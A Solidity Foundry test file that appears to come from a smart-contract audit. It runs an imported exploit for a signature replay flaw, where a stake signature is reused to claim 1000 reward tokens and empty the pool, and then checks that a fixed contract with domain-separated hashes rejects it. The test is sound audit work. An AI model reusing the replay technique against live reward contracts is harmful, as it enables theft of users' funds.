// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    RewardToken,
    OrderHashTyped,
    SapienRewardsFixed
} from "./62036-signature-replay-attack-possible-between-stake-unstake-and-r.sol";

contract Finding62036Test is Test {
    function test_exploit_stake_signature_claims_rewards() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.token().balanceOf(e.USER()), 1000e18, "user received 1000");
        assertEq(e.token().balanceOf(address(e.rewards())), 0, "reward pool empty");
    }

    function test_control_typed_hash_rejects_stake_signature() public {
        RewardToken token = new RewardToken();
        OrderHashTyped hasher = new OrderHashTyped();
        address signer = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
        SapienRewardsFixed fixedRewards = new SapienRewardsFixed(token, signer, hasher);
        token.mint(address(fixedRewards), 1000e18);

        address user = 0x1111111111111111111111111111111111111111;
        uint256 amount = 1000e18;
        bytes32 orderId = 0x4f524445525f313030305f310000000000000000000000000000000000000000;
        bytes32 stakeHash = hasher.hashStake(user, amount, orderId);
        bytes32 rewardHash = hasher.hashReward(user, amount, orderId);
        assertTrue(stakeHash != rewardHash, "domain separates");

        bool paid = true;
        try fixedRewards.claimReward(
            user,
            amount,
            orderId,
            27,
            0xe59b4bf1ff6ea1cf19867e4953cd3c9e56190a6424666ccdedb0e09859ebb374,
            0x1eb5f965694130e3b83aa2d9f54f4ccfdefdf15aee40053e0e6e09bd8c42ddc3
        ) {
            paid = true;
        } catch {
            paid = false;
        }
        assertFalse(paid, "stake signature is not a reward signature");
        assertEq(token.balanceOf(user), 0, "control moved 0");
        assertEq(token.balanceOf(address(fixedRewards)), 1000e18, "pool kept 1000");
    }
}
